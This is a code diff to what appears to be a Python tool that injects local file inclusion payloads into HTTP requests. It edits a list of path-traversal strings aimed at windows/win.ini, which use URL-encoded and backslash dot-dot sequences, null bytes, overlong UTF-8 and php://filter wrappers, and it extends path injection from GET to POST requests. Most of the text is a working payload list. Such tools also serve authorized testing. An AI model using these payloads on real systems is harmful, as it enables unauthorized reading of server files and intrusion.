@@ -12,31 +12,31 @@ init(autoreset=True)
 
 # Configuration
 LFI_PAYLOADS = [
-    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini&?",
-    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini&?",
-    "/./././././././././././windows/win.ini&?",
-    "/../../../../../../../../../../../windows/win.ini&?",
-#    "/..\../..\../..\../..\../..\../..\../windows/win.ini&?",
-#    "/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini&?",
-#    "..//..//..//..//..//windows//win.ini&?",
-#    "../../../../../../../../../../../../windows/win.ini&?",
-#    "../../windows/win.ini&?",
-#    "..\../..\../..\../..\../windows/win.ini&?",
-#    "..\../..\../windows/win.ini&?",
-#    "..\..\..\..\..\..\..\..\..\..\windows\win.ini&?",
-#    "\..\..\..\..\..\..\..\..\..\..\windows\win.ini&?",
-#    "/../../../../../../../../../../../windows/win.ini%00&?",
-#    "../../../../../../../../../../../../windows/win.ini%00&?",
-#    "..\..\..\..\..\..\..\..\..\..\windows\win.ini%00&?",
-#    "/../../../../../../../../../../../windows/win.ini%00.html&?",
-#    "/../../../../../../../../../../../windows/win.ini%00.jpg&?",
-#    "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../windows/win.ini&?",
-#    "../../../../../../../../windows/win.ini&?",
-#    "..\..\..\..\..\..\..\..\windows\win.ini&?",
-#    "c:\windows\win.ini&?",
-#    "c:/windows/win.ini&?",
-#    "php://filter/zlib.deflate/convert.base64-encode/resource=c:/windows/win.ini&?",
-#    "php://filter/zlib.deflate/convert.base64-encode/resource=c:\windows\win.ini&?"
+    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
+    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini",
+    "/./././././././././././windows/win.ini",
+    "/../../../../../../../../../../../windows/win.ini",
+#    "/..\../..\../..\../..\../..\../..\../windows/win.ini",
+#    "/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini",
+#    "..//..//..//..//..//windows//win.ini",
+#    "../../../../../../../../../../../../windows/win.ini",
+#    "../../windows/win.ini",
+#    "..\../..\../..\../..\../windows/win.ini",
+#    "..\../..\../windows/win.ini",
+#    "..\..\..\..\..\..\..\..\..\..\windows\win.ini",
+#    "\..\..\..\..\..\..\..\..\..\..\windows\win.ini",
+#    "/../../../../../../../../../../../windows/win.ini%00",
+#    "../../../../../../../../../../../../windows/win.ini%00",
+#    "..\..\..\..\..\..\..\..\..\..\windows\win.ini%00",
+#    "/../../../../../../../../../../../windows/win.ini%00.html",
+#    "/../../../../../../../../../../../windows/win.ini%00.jpg",
+#    "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../windows/win.ini",
+#    "../../../../../../../../windows/win.ini",
+#    "..\..\..\..\..\..\..\..\windows\win.ini",
+#    "c:\windows\win.ini",
+#    "c:/windows/win.ini",
+#    "php://filter/zlib.deflate/convert.base64-encode/resource=c:/windows/win.ini",
+#    "php://filter/zlib.deflate/convert.base64-encode/resource=c:\windows\win.ini"
 ]
 DEFAULT_TIMEOUT = 10
 
@@ -118,7 +118,7 @@ async def inject_lfi_payload(session, request, semaphore):
                     continue
 
         # Path-Based LFI Detection (only modify path)
-        if method == "GET":
+        if method == "GET" or method == "POST":
             path_parts = parsed_url.path.split('/')
 
             # Look for path segments that could be vulnerable
